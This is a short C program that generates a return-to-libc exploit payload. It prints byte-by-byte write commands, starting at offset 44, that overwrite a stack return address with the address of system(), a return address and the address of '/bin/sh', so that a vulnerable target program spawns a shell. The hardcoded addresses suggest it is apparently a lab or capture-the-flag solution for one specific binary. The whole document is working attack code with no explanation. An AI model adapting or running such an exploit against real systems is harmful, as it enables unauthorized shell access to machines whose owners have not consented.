#include <stdio.h>

int main() {
	// the address of system()
	int system_addr = 0xb7c524c0;

	// the original return address
	int system_return_addr = 0x0040165c;

	// the address of "/bin/sh"
	int system_arg_addr = 0xb7dc9e3c;
	
	int offset = 44;

	for (int i = 0; i < 4; i++) {
	  printf("w,%d,%d\n", offset, system_addr);
	  offset += 1;
	  system_addr = system_addr >> 8;
	}
	
	for (int i = 0; i < 4; i++) {
	  printf("w,%d,%d\n", offset, system_return_addr);
	  offset += 1;
	  system_return_addr = system_return_addr >> 8;
	}

	for (int i = 0; i < 4; i++) {
	  printf("w,%d,%d\n", offset, system_arg_addr);
	  offset += 1;
	  system_arg_addr = system_arg_addr >> 8;
	}

	printf("q\n");

}
